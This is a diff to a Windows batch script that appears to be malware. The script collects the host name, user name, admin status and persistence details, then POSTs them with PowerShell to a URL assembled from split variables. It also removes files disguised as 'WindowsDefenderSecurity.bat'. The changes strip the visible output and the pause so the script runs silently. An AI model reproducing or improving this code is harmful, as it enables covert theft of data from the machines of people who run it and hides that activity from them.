@@ -1,4 +1,4 @@
-
+@echo off
 setlocal
 cls
 
@@ -146,8 +146,6 @@ set "url=%url1%%url2%"
 
 set "content=%ComputerName%;%USERNAME%;%time%;%version%;%AdminRights%;%userfile%;%pcfile%;%userauto%;%pcauto%;%userregistryfile%;%pcregistryfile%;%userregistryauto%;%pcregistryauto%"
 
-echo %content%
-
 powershell -Command "[System.Net.WebRequest]::DefaultWebProxy = [System.Net.WebRequest]::GetSystemWebProxy(); [System.Net.WebRequest]::DefaultWebProxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials; $body = @{content='%content%'} | ConvertTo-Json; Invoke-RestMethod -Uri '%url%' -Method POST -ContentType 'application/json' -Body $body"
 
 
@@ -165,8 +163,6 @@ if exist "%PROGRAMDATA%/WindowsDefenderSecurity/WindowsDefenderSecurity.bat" (
 if exist "%APPDATA%/WindowsDefenderSecurity/WindowsDefenderSecurity.bat" (
     del /f /q "%APPDATA%\WindowsDefenderSecurity\WindowsDefenderSecurity.bat"
 )
-
-pause
 
 endlocal
 exit
